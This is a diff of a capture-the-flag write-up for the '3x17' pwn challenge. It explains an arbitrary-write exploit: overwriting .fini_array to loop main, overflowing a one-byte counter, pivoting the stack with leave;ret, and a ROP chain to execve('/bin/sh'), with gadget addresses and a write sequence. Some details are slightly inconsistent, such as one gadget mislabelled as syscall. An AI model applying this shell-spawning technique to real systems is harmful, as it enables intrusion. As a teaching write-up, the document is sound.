@@ -1,8 +1,7 @@
 
-┌─────────────┬───────────────────────────[ calc Writeup ]──────────────────────────────────────────
+┌─────────────┬───────────────────────────[ 3x17 Writeup ]──────────────────────────────────────────
 | Description |
 └─────────────┘
-NX, Canary, stripped
 
 Strace 
 
@@ -27,15 +26,25 @@ exit_group(0)                           = ?
 
 Decompile 
 
+// FUN_00401eb0 is __libc_start_main 
+// The arguments are (main, argc, argv, init, fini, rtld_fini, stack_end)
+void processEntry entry(undefined8 param_1,undefined8 param_2) {
+   undefined1 auStack_8 [8];
+   FUN_00401eb0(FUN_00401b6d, param_2, &stack0x00000008, FUN_004028d0, FUN_00402960, param_1, auStack_8);
+   do {
+   } while( true );
+}
+
+call_counter DAT_004b9330 = 0;                            // This is likely a global
 main FUN_00401b6d(void) { 
   char cVar1;
   int iVar2;                                              // data
   long in_FS_OFFSET;
   undefined1 local_28 [24];                               // Addr
   long local_10 = *(long *)(in_FS_OFFSET + 0x28);         // Stack Canary
-  DAT_004b9330 = DAT_004b9330 + '\x01';
-  cVar1 = DAT_004b9330;
-  if (DAT_004b9330 == '\x01') {
+  call_counter = call_counter + '\x01';                   // Prevents arbitrary write from occuring multiple times
+  cVar1 = call_counter
+  if (call_counter == '\x01') {
     FUN_00446ec0(1,"addr:",5);                            // Write
     FUN_00446e20(0, local_28, 0x18);                      // Read addr
     iVar2 = FUN_0040ee70(local_28);                       // iVar2 is ??? (returns ulong???) 
@@ -49,28 +58,108 @@ main FUN_00401b6d(void) {
   return cVar1;
 }
 
-Where 65535 => 0xffff
-0x40ee70 (
-   $rdi = 0x00007fffffffda00 → "65535\n)@",
-)
-
-0x446e20 (
-   $rdi = 0x0000000000000000,
-   $rsi = 0x000000000000ffff,
-   $rdx = 0x0000000000000018
-)
-
-
 ┌─────────┐
 | Exploit |
 └─────────┘
+ASLR, NX, stripped
 The exploit primitive is an arbitrary write primitive
-pass address as decimal, and value 
 
-          High
-main     ┌─────────────────┐ 
+Overwriting return addr of main() is pointless without another primitive for leak. 
+Even if overwriting return addr with main() we must overwrite to exact instr of primitive because of global check
+No PIE means, we can write to .bss, .data, .fini_arrays, .init_arrays comfortably (static addresses)
+
+[Nr] Name              Type             Address           Offset
+     Size              EntSize          Flags  Link  Info  Align
+[15] .init_array       INIT_ARRAY       00000000004b40e0  000b30e0
+     0000000000000010  0000000000000008  WA       0     0     8
+[16] .fini_array       FINI_ARRAY       00000000004b40f0  000b30f0
+     0000000000000010  0000000000000008  WA       0     0     8
+[20] .data             PROGBITS         00000000004b70e0  000b60e0
+     0000000000001af0  0000000000000000  WA       0     0     32
+[24] .bss              NOBITS           00000000004b92e0  000b82d0
+     0000000000001718  0000000000000000  WA       0     0     32
+
+// The .fini section will run at the end main. It iterates over .fini_array data (addrs) 
+__libc_csu_fini FUN_00402960(void) {
+  long lVar1;  
+  lVar1 = 1;                                               // .fini_array holds 2 entries (8 bytes)
+  do {
+    (*(code *)(&PTR_FUN_004b40f0)[lVar1])();
+    lVar1 = lVar1 + -1;
+  } while (lVar1 != -1);
+  FUN_0048e32c();
+  return;
+}
+
+We can thus overwrite .fini_array[1] and .fini_array[0]
+To get infinite amount of arbitrary writes, we can set .fini_array[1] (funcptr called first) to main()
+.fini_array[2] can be set to FUN_00402960 or (__libc_csu_fini)
+call_counter is a roadblock which will block majority of calls to main executing the arbitrary write.
+However because call_counter is char (1 byte) when it overflows it will pass the check (the assembly confirms this)
+ 0x401b9b                  cmp    al, 0x1
+%al is 1 byte thus the loop has to call main 256 times before main will run exploit  
+
+Example
+input 1: 4931824 (decimal for .fini_array address 0x04b40f0)
+input 2: AAAABBBBCCCCDDDD
+Before
+0x4b40f0:       0x00401b00      0x00000000      0x00401580      0x00000000
+After
+0x4b40f0:       0x41414141      0x42424242      0x43434343      0x44444444
+.fini_array[1] will thus be 0x4444444443434343 and .fini_array[0] will be 0x4242424241414141
+
+ROP Chain [execve("/bin/sh")]
+0x41e4af : pop rax ; ret
+0x401696 : pop rdi ; ret
+0x406c30 : pop rsi ; ret
+0x446e35 : pop rdx ; ret
+0x4022b4 : syscall
+0x401c4b : leave ; ret
+
+Stack pivot [leave; ret] = [mov rsp, rbp ; pop rbp ; ret]
+This means that rsp is set to 0x4b40f0 because that is what the rbp will be 
+ret instr means rsp = 0x4b40f8 - ROP Chain must start here!
+
+Memory Layout
+         High 
+         ┌─────────────────┐
+0x4b4140 | /bin/sh         | [8 bytes]
          ├─────────────────┤
+0x4b4138 | syscall         | [8 bytes]
          ├─────────────────┤
+0x4b4130 | 0x3b            | [8 bytes]
          ├─────────────────┤
+0x4b4128 | pop rax ; ret   | [8 bytes]
+         ├─────────────────┤
+0x4b4120 | 0x0             | [8 bytes]
+         ├─────────────────┤
+0x4b4118 | pop rdx ; ret   | [8 bytes]
+         ├─────────────────┤
+0x4b4110 | 0x0             | [8 bytes]
+         ├─────────────────┤
+0x4b4108 | pop rsi ; ret   | [8 bytes]
+         ├─────────────────┤
+0x4b4100 | /bin/sh addr    | [8 bytes]
+         ├─────────────────┤
+0x4b40f8 | pop rdi ; ret   | [8 bytes]
+         ├─────────────────┤
+0x4b40f0 | fini_array[0]   | [8 bytes]
          └─────────────────┘
          Low
+
+0x4b40f0
+0x402960 + 0x401b6d               // fini_array[1] = main, fini_array[0] = __libc_csu_fini
+
+0x4b4100 
+0x4b4140 + 0x406c30 + 0x0         // "/bin/sh" addr, pop rsi, 0x0
+
+0x4b4118 
+0x446e35 + 0x0 + 0x41e4af         // pop rdx, 0x0, pop rax
+
+0x4b4130
+0x3b + 0x401696 + "/bin/sh"       // 0x3b, syscall, "/bin/sh"
+
+0x4b40f0
+0x401c4b + 0x401696               // leave ; ret, pop rdi
+
+
